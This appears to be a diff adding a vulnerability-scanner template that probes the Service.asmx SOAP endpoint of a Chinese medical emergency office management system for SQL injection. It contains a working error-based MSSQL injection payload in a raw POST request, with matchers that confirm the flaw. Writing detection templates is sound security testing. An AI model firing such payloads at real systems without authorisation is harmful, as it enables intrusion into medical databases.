@@ -1,0 +1,45 @@
+id: poc-yaml-anke-service-asmx-sqli
+info:
+  name: 安克医疗急救办公管理系统 Service.asmx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Service.asmx endpoint in 安克医疗急救办公管理系统 is vulnerable to SQL injection, which can lead to sensitive information exposure or unauthorized database access.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/Service.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetAmbulance"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetAmbulance xmlns="http://tempuri.org/">
+              <CNumber>1' AND 6537 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))-- ntgj</CNumber>
+            </GetAmbulance>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "0x{{t2}}"
+          - "转换成数据类型 int 时失败"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
